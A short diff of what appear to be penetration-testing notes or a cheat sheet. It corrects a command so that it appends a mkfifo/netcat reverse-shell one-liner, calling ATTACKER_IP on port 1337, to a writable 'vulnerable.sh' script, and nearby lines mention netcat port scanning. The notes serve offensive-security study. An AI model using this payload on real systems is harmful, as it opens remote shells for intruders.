@@ -24,7 +24,7 @@ cat /proc/net/dev
 ```bash
 # Adding a newline to the vulnerable script
 echo >> vulnerable.sh 
-echo "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1  | nc ATTACKER_IP 1337 > /tmp/f"
+echo "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1  | nc ATTACKER_IP 1337 > /tmp/f" >> vulnerable.sh
 ```
 
 * TCP scanning with `nc`. `-w` specifies timeout in seconds. 
